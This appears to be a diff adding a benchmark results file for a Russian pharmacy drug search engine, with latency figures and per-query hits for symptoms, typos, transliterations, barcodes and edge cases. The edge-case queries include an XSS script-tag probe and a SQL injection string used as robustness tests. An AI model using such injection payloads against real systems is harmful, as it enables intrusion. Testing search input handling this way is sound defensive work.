@@ -1,0 +1,1170 @@
+{
+  "timestamp": "2026-11-07T15:32:24.784Z",
+  "drugs_count": 7487,
+  "memory_rss_mb": 19.18359375,
+  "total_queries": 165,
+  "total_found": 129,
+  "rps": 94.94916567776238,
+  "latency_avg_ms": 10.531951416969697,
+  "latency_p50_ms": 10.9402663,
+  "latency_p95_ms": 20.391252100000003,
+  "latency_p99_ms": 25.3712693,
+  "latency_max_ms": 25.6907861,
+  "details": [
+    {
+      "category": "Symptoms (40)",
+      "query": "таблетки от гриппа",
+      "latency_ms": "17.28",
+      "found_count": 60,
+      "top_hit": "Тромбопол табл. п/к/р оболочкой 75 мг №30"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "от давления",
+      "latency_ms": "14.52",
+      "found_count": 60,
+      "top_hit": "Энап® 10 мг табл. №20"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "болит живот",
+      "latency_ms": "25.37",
+      "found_count": 60,
+      "top_hit": "Омес 20мг №20*10 капс"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "от головной боли",
+      "latency_ms": "25.69",
+      "found_count": 60,
+      "top_hit": "Кетонал® , капс. 50 мг, № 25"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "жаропонижающее",
+      "latency_ms": "6.23",
+      "found_count": 60,
+      "top_hit": "G-Мол, сироп 120 мг/5 мл 60 мл №1"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "от аллергии",
+      "latency_ms": "9.67",
+      "found_count": 37,
+      "top_hit": "Лоратал® табл. 10 мг №10"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "успокоительное",
+      "latency_ms": "10.58",
+      "found_count": 12,
+      "top_hit": "Валидол, капсулы, 100 мг, №15"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "от кашля",
+      "latency_ms": "12.67",
+      "found_count": 60,
+      "top_hit": "Ингамист, р-р д/ин.амп. 100 мг/мл 3 мл №10"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "от изжоги",
+      "latency_ms": "8.75",
+      "found_count": 60,
+      "top_hit": "Омес 20мг №20*10 капс"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "антибиотик",
+      "latency_ms": "9.05",
+      "found_count": 60,
+      "top_hit": "Зицин капс. 250мг №6"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "от простуды",
+      "latency_ms": "11.29",
+      "found_count": 60,
+      "top_hit": "G-Мол, сироп 120 мг/5 мл 60 мл №1"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "от температуры",
+      "latency_ms": "8.53",
+      "found_count": 60,
+      "top_hit": "G-Мол, сироп 120 мг/5 мл 60 мл №1"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "высокая температура",
+      "latency_ms": "8.95",
+      "found_count": 60,
+      "top_hit": "G-Мол, сироп 120 мг/5 мл 60 мл №1"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "лихорадка",
+      "latency_ms": "7.46",
+      "found_count": 60,
+      "top_hit": "G-Мол, сироп 120 мг/5 мл 60 мл №1"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "жар",
+      "latency_ms": "9.74",
+      "found_count": 60,
+      "top_hit": "Жарафлю, порошок для приготовления раствора для приема внутрь со вкусом лимона, 325 мг + 20 мг + 10 мг + 50 мг, №10"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "гипертония",
+      "latency_ms": "11.04",
+      "found_count": 60,
+      "top_hit": "Энап® 10 мг табл. №20"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "от давления таблетки",
+      "latency_ms": "19.70",
+      "found_count": 60,
+      "top_hit": "Энап® 10 мг табл. №20"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "болит голова",
+      "latency_ms": "15.81",
+      "found_count": 60,
+      "top_hit": "Кетонал® , капс. 50 мг, № 25"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "мигрень",
+      "latency_ms": "7.66",
+      "found_count": 39,
+      "top_hit": "Гиненорм, раствор вагинальный 0,1% 100 мл №5"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "сильная боль",
+      "latency_ms": "17.68",
+      "found_count": 60,
+      "top_hit": "Кетонал® , капс. 50 мг, № 25"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "боль в желудке",
+      "latency_ms": "25.10",
+      "found_count": 60,
+      "top_hit": "Омес 20мг №20*10 капс"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "желудок",
+      "latency_ms": "9.23",
+      "found_count": 51,
+      "top_hit": "Омес 20мг №20*10 капс"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "спазм",
+      "latency_ms": "6.10",
+      "found_count": 16,
+      "top_hit": "Спазмалгон, таблетки, №20"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "для пищеварения",
+      "latency_ms": "7.51",
+      "found_count": 19,
+      "top_hit": "Линекс®, капсулы, №16"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "тошнота",
+      "latency_ms": "6.34",
+      "found_count": 19,
+      "top_hit": "Церукал®, таблетки 10 мг №50"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "рвота",
+      "latency_ms": "5.65",
+      "found_count": 18,
+      "top_hit": "Церукал®, таблетки 10 мг №50"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "зуд",
+      "latency_ms": "5.78",
+      "found_count": 33,
+      "top_hit": "Лоратал® табл. 10 мг №10"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "бронхит",
+      "latency_ms": "8.09",
+      "found_count": 60,
+      "top_hit": "Амоксициллин табл. 500 мг №20"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "болит горло",
+      "latency_ms": "19.84",
+      "found_count": 60,
+      "top_hit": "Кетонал® , капс. 50 мг, № 25"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "ангина",
+      "latency_ms": "8.35",
+      "found_count": 60,
+      "top_hit": "Амоксициллин табл. 500 мг №20"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "капли в нос",
+      "latency_ms": "11.65",
+      "found_count": 29,
+      "top_hit": "Пиносол®, капли назальные, 10 мл, №1"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "насморк",
+      "latency_ms": "9.04",
+      "found_count": 16,
+      "top_hit": "Нафтизин, капли назальные, 0,1%, 10 мл"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "сопли",
+      "latency_ms": "6.65",
+      "found_count": 12,
+      "top_hit": "Нафтизин, капли назальные, 0,1%, 10 мл"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "для сна",
+      "latency_ms": "3.06",
+      "found_count": 4,
+      "top_hit": "Гербастресс® для сна, капсулы, №20"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "от стресса",
+      "latency_ms": "8.41",
+      "found_count": 6,
+      "top_hit": "Афобазол®, таблетки, 10 мг, №60"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "для сердца",
+      "latency_ms": "10.72",
+      "found_count": 26,
+      "top_hit": "Нитроспрей спрей подъяз.доз. 0,4 мг/доза 200 доз 10 мл №1"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "для печени",
+      "latency_ms": "9.45",
+      "found_count": 15,
+      "top_hit": "Урсосан®, капсулы, 250 мг, №10"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "витамины",
+      "latency_ms": "15.37",
+      "found_count": 47,
+      "top_hit": "Пиковит®, пастилки, №30"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "диарея",
+      "latency_ms": "11.44",
+      "found_count": 23,
+      "top_hit": "Имодиум®, капсулы, 2 мг, №20"
+    },
+    {
+      "category": "Symptoms (40)",
+      "query": "понос",
+      "latency_ms": "17.39",
+      "found_count": 44,
+      "top_hit": "Имодиум®, капсулы, 2 мг, №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "парацетамал",
+      "latency_ms": "11.66",
+      "found_count": 47,
+      "top_hit": "Парацетамол, сироп, 2,4% 90 мл, №1"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "цытрамон",
+      "latency_ms": "12.02",
+      "found_count": 8,
+      "top_hit": "Цитрамон, таблетки, №10"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "ибупрафен",
+      "latency_ms": "18.00",
+      "found_count": 42,
+      "top_hit": "Ибупрофен-НИКА, капсулы, 200 мг, №10"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "эналаприлл",
+      "latency_ms": "16.97",
+      "found_count": 14,
+      "top_hit": "Эналаприл табл. 10 мг №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "аспиринн",
+      "latency_ms": "16.37",
+      "found_count": 8,
+      "top_hit": "Аспирин® С, таблетки шипучие, №10"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "ношпа",
+      "latency_ms": "16.33",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "аналгин",
+      "latency_ms": "14.87",
+      "found_count": 8,
+      "top_hit": "Анальгин, таблетки, 500 мг, №10"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "супрастен",
+      "latency_ms": "12.16",
+      "found_count": 5,
+      "top_hit": "Супрастин®, таблетки, 25 мг, №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "мезим фортее",
+      "latency_ms": "12.87",
+      "found_count": 7,
+      "top_hit": "Мезим® форте, таблетки, покрытые оболочкой, №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "амбраксол",
+      "latency_ms": "18.23",
+      "found_count": 18,
+      "top_hit": "Амброксол, таблетки, 30 мг, №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "кетанав",
+      "latency_ms": "13.88",
+      "found_count": 7,
+      "top_hit": "Кетанейм, крем, 5%, 30 г"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "омепразолл",
+      "latency_ms": "13.43",
+      "found_count": 15,
+      "top_hit": "Омепразол капс. 20 мг №30"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "азитрамицин",
+      "latency_ms": "12.74",
+      "found_count": 46,
+      "top_hit": "Азитромицин, капсулы, 250 мг, №6"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "диклофинак",
+      "latency_ms": "14.23",
+      "found_count": 54,
+      "top_hit": "Диклофенак, гель, 1%, 50 г №1"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "лоратадын",
+      "latency_ms": "16.69",
+      "found_count": 14,
+      "top_hit": "Лоратадин, табл.10 мг №10"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "пантенолл",
+      "latency_ms": "16.35",
+      "found_count": 2,
+      "top_hit": "Пантенол Фармстандарт, аэрозоль для наружного применения, 5%, 58 г №1"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "валокордин",
+      "latency_ms": "13.64",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "корвалолл",
+      "latency_ms": "14.07",
+      "found_count": 2,
+      "top_hit": "Корвалол®, капли оральные, 25 мл"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "глицын",
+      "latency_ms": "12.13",
+      "found_count": 3,
+      "top_hit": "Глицин, таблетки подъязычные, 100 мг, №50"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "бисопралол",
+      "latency_ms": "11.70",
+      "found_count": 36,
+      "top_hit": "Бисопролол 5 мг табл.п.п.о. №30"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "амоксицилин",
+      "latency_ms": "17.94",
+      "found_count": 44,
+      "top_hit": "Амоксициллин табл. 500 мг №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "цефтриаксонн",
+      "latency_ms": "14.97",
+      "found_count": 6,
+      "top_hit": "Корвалол®, капли оральные, 25 мл"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "дротаверинн",
+      "latency_ms": "20.46",
+      "found_count": 4,
+      "top_hit": "Дротаверин, таблетки, 40 мг, №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "креонн",
+      "latency_ms": "20.37",
+      "found_count": 2,
+      "top_hit": "Креон® 10000, капсулы кишечнорастворимые, 150 мг, №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "реннии",
+      "latency_ms": "20.39",
+      "found_count": 6,
+      "top_hit": "Ренни®, таблетки жевательные, №24"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "маалоксс",
+      "latency_ms": "15.50",
+      "found_count": 2,
+      "top_hit": "Маалокс®, таблетки жевательные, №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "афобазолл",
+      "latency_ms": "14.89",
+      "found_count": 2,
+      "top_hit": "Афобазол®, таблетки, 10 мг, №60"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "валидолл",
+      "latency_ms": "15.13",
+      "found_count": 4,
+      "top_hit": "Валидол, капсулы, 100 мг, №15"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "карсил",
+      "latency_ms": "14.30",
+      "found_count": 1,
+      "top_hit": "Карсил®, таблетки, покрытые оболочкой, 22,5 мг, №80"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "эссенсиале",
+      "latency_ms": "11.51",
+      "found_count": 4,
+      "top_hit": "Эссенциале® Форте Н, капсулы, 300 мг, №30"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "лоперамидд",
+      "latency_ms": "12.26",
+      "found_count": 12,
+      "top_hit": "Лоперамид, капсулы, 2 мг, №10"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "смектаа",
+      "latency_ms": "14.48",
+      "found_count": 1,
+      "top_hit": "Смектит, порошок для приготовления суспензии для приема внутрь в комплекте с водой очищенной, 3 г, №30"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "полисорбб",
+      "latency_ms": "14.48",
+      "found_count": 3,
+      "top_hit": "Полисорб МП, порошок для приготовления суспензии для приема внутрь, 12 г, №1"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "эргоферонн",
+      "latency_ms": "16.99",
+      "found_count": 1,
+      "top_hit": "Эргоферон, таблетки для рассасывания, №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "ингавиринн",
+      "latency_ms": "15.40",
+      "found_count": 3,
+      "top_hit": "Ингавирин®, капсулы, 60 мг, №7"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "нимесилл",
+      "latency_ms": "12.31",
+      "found_count": 2,
+      "top_hit": "Нимесил®, гранулы для приготовления суспензии, для приема внутрь, 100 мг, №30"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "спазмалгоон",
+      "latency_ms": "5.79",
+      "found_count": 11,
+      "top_hit": "Спазмалгон, таблетки, №20"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "кеторолл",
+      "latency_ms": "10.79",
+      "found_count": 1,
+      "top_hit": "Кеторолак, раствор для внутривенного и внутримышечного введения, 30 мг/мл, 1 мл №10"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "називинн",
+      "latency_ms": "10.48",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Typos & Fuzzy (40)",
+      "query": "отривинн",
+      "latency_ms": "10.90",
+      "found_count": 4,
+      "top_hit": "Отривин, капли назальные, 0,05% 10 мл, №1"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "paracetamol",
+      "latency_ms": "12.91",
+      "found_count": 46,
+      "top_hit": "Парацетамол, сироп, 2,4% 90 мл, №1"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "no-shpa",
+      "latency_ms": "5.89",
+      "found_count": 5,
+      "top_hit": "Но-шпа®, таблетки, 40 мг, №24"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "aspirin",
+      "latency_ms": "6.53",
+      "found_count": 8,
+      "top_hit": "Аспирин® С, таблетки шипучие, №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "analgin",
+      "latency_ms": "16.40",
+      "found_count": 8,
+      "top_hit": "Анальгин, таблетки, 500 мг, №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "ibuprofen",
+      "latency_ms": "6.30",
+      "found_count": 27,
+      "top_hit": "Ибупрофен, таблетки, покрытые оболочкой, 200 мг, №20"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "enalapril",
+      "latency_ms": "14.97",
+      "found_count": 14,
+      "top_hit": "Эналаприл табл. 10 мг №20"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "amoxicillin",
+      "latency_ms": "16.14",
+      "found_count": 60,
+      "top_hit": "Амоксициллин табл. 500 мг №20"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "azithromycin",
+      "latency_ms": "16.17",
+      "found_count": 45,
+      "top_hit": "Азитромицин, капсулы, 250 мг, №6"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "ceftriaxone",
+      "latency_ms": "15.72",
+      "found_count": 38,
+      "top_hit": "Цефтриаксон натрия, порошок для инъекций, 1 г, №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "citramon",
+      "latency_ms": "21.97",
+      "found_count": 8,
+      "top_hit": "Цитрамон, таблетки, №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "suprastin",
+      "latency_ms": "20.56",
+      "found_count": 5,
+      "top_hit": "Супрастин®, таблетки, 25 мг, №20"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "loratadine",
+      "latency_ms": "22.08",
+      "found_count": 13,
+      "top_hit": "Лоратадин, табл.10 мг №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "omeprazole",
+      "latency_ms": "17.99",
+      "found_count": 15,
+      "top_hit": "Омепразол капс. 20 мг №30"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "mezim",
+      "latency_ms": "7.29",
+      "found_count": 7,
+      "top_hit": "Мезим® форте, таблетки, покрытые оболочкой, №20"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "ketorol",
+      "latency_ms": "18.15",
+      "found_count": 1,
+      "top_hit": "Кеторолак, раствор для внутривенного и внутримышечного введения, 30 мг/мл, 1 мл №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "ketonal",
+      "latency_ms": "8.29",
+      "found_count": 22,
+      "top_hit": "Кетонал® , капс. 50 мг, № 25"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "spasmalgon",
+      "latency_ms": "16.79",
+      "found_count": 2,
+      "top_hit": "Спазмалгон, таблетки, №20"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "diclofenac",
+      "latency_ms": "7.88",
+      "found_count": 60,
+      "top_hit": "Диклофенак супп.рект. 100 мг №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "bisoprolol",
+      "latency_ms": "6.31",
+      "found_count": 60,
+      "top_hit": "Бисопролол 5 мг табл.п.п.о. №30"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "nurofen",
+      "latency_ms": "8.93",
+      "found_count": 24,
+      "top_hit": "Нурофен® Экспресс, капсулы, 200 мг, №8"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "teraflyu",
+      "latency_ms": "9.96",
+      "found_count": 4,
+      "top_hit": "ТераФлю, порошок для приготовления раствора для приема внутрь (лимонный), №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "coldrex",
+      "latency_ms": "9.10",
+      "found_count": 5,
+      "top_hit": "Колдрекс МаксГрипп, порошок для приготовления раствора для приема внутрь (лимонный), №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "smecta",
+      "latency_ms": "19.73",
+      "found_count": 1,
+      "top_hit": "Смектит, порошок для приготовления суспензии для приема внутрь в комплекте с водой очищенной, 3 г, №30"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "loperamide",
+      "latency_ms": "22.78",
+      "found_count": 12,
+      "top_hit": "Лоперамид, капсулы, 2 мг, №10"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "glycine",
+      "latency_ms": "18.10",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "validol",
+      "latency_ms": "6.66",
+      "found_count": 4,
+      "top_hit": "Валидол, таблетки подъязычные, 60 мг, №6"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "corvalol",
+      "latency_ms": "14.12",
+      "found_count": 2,
+      "top_hit": "Корвалол®, капли оральные, 25 мл"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "ambroxol",
+      "latency_ms": "6.51",
+      "found_count": 22,
+      "top_hit": "Амброксол, таблетки, 30 мг, №20"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "nazivin",
+      "latency_ms": "15.27",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "otrivin",
+      "latency_ms": "6.82",
+      "found_count": 4,
+      "top_hit": "Отривин, спрей назальный дозированный, 0,1% 10 мл, №1"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "creon",
+      "latency_ms": "17.71",
+      "found_count": 2,
+      "top_hit": "Креон® 10000, капсулы кишечнорастворимые, 150 мг, №20"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "pancreatin",
+      "latency_ms": "10.94",
+      "found_count": 7,
+      "top_hit": "Панкреатин, таблетки кишечнорастворимые, покрытые оболочкой, 25 ЕД, №60"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "afobazol",
+      "latency_ms": "19.68",
+      "found_count": 2,
+      "top_hit": "Афобазол®, таблетки, 10 мг, №60"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "karsil",
+      "latency_ms": "13.64",
+      "found_count": 1,
+      "top_hit": "Карсил®, таблетки, покрытые оболочкой, 22,5 мг, №80"
+    },
+    {
+      "category": "Latin & Translit (35)",
+      "query": "ergofeon",
+      "latency_ms": "14.58",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "46012345",
+      "latency_ms": "1.50",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "46070032",
+      "latency_ms": "1.56",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": " 46070032 ",
+      "latency_ms": "1.49",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "460 700 32",
+      "latency_ms": "1.35",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "0000000046070032",
+      "latency_ms": "10.59",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "0046070032",
+      "latency_ms": "1.49",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "006487201701",
+      "latency_ms": "1.56",
+      "found_count": 1,
+      "top_hit": "Вингис, капсулы, 150 мг/30 мг/8,2 мг, №20"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "052152017009",
+      "latency_ms": "1.48",
+      "found_count": 1,
+      "top_hit": "Вингис, раствор для инъекций, 10 мл, №5"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": " 006487201701 ",
+      "latency_ms": "1.72",
+      "found_count": 1,
+      "top_hit": "Вингис, капсулы, 150 мг/30 мг/8,2 мг, №20"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "006 487 201 701",
+      "latency_ms": "1.69",
+      "found_count": 1,
+      "top_hit": "Вингис, капсулы, 150 мг/30 мг/8,2 мг, №20"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "4840944000294",
+      "latency_ms": "1.69",
+      "found_count": 2,
+      "top_hit": "Рино Бэби, капли назальные, 0,1 мг/мл 10 мл, №1"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "4840944000300",
+      "latency_ms": "1.79",
+      "found_count": 2,
+      "top_hit": "Рино Бэби, капли назальные, 0,1 мг/мл 10 мл, №1"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "4607003241234",
+      "latency_ms": "1.73",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": " 4840944000294 ",
+      "latency_ms": "2.17",
+      "found_count": 2,
+      "top_hit": "Рино Бэби, капли назальные, 0,1 мг/мл 10 мл, №1"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "484 0944 000 294",
+      "latency_ms": "1.80",
+      "found_count": 2,
+      "top_hit": "Рино Бэби, капли назальные, 0,1 мг/мл 10 мл, №1"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "04840944000294",
+      "latency_ms": "2.20",
+      "found_count": 2,
+      "top_hit": "Рино Бэби, капли назальные, 0,1 мг/мл 10 мл, №1"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "0797776554249",
+      "latency_ms": "1.81",
+      "found_count": 1,
+      "top_hit": "Севел 800, таблетки, покрытые пленочной оболочкой, 800 мг, №3х10"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "14607003241231",
+      "latency_ms": "1.82",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": " 14607003241231 ",
+      "latency_ms": "1.53",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "1460 7003 2412 31",
+      "latency_ms": "1.50",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "0014607003241231",
+      "latency_ms": "14.18",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "1234567",
+      "latency_ms": "13.35",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "123456789012345",
+      "latency_ms": "12.90",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "00000000",
+      "latency_ms": "1.70",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Barcodes (25)",
+      "query": "0000000000000",
+      "latency_ms": "1.91",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "",
+      "latency_ms": "0.00",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "   ",
+      "latency_ms": "0.00",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "\t\n\r",
+      "latency_ms": "0.00",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "а",
+      "latency_ms": "5.74",
+      "found_count": 60,
+      "top_hit": "Аторис 10 мг № 30 табл"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "z",
+      "latency_ms": "12.03",
+      "found_count": 60,
+      "top_hit": "Зицин капс. 250мг №6"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "1",
+      "latency_ms": "11.87",
+      "found_count": 60,
+      "top_hit": "Омес 20мг №20*10 капс"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "от",
+      "latency_ms": "0.01",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "для",
+      "latency_ms": "0.01",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "при",
+      "latency_ms": "0.01",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "от для при",
+      "latency_ms": "0.01",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "!!!???***",
+      "latency_ms": "0.01",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "💊",
+      "latency_ms": "0.01",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "💊💉🩺",
+      "latency_ms": "0.01",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "таблетки 💊",
+      "latency_ms": "5.83",
+      "found_count": 60,
+      "top_hit": "Таблетки от кашля, таблетки, №10"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "<script>alert(\"xss\")</script>",
+      "latency_ms": "17.44",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "' OR '1'='1",
+      "latency_ms": "6.77",
+      "found_count": 60,
+      "top_hit": "Орадро 500 мг табл.п.п.о. №14"
+    },
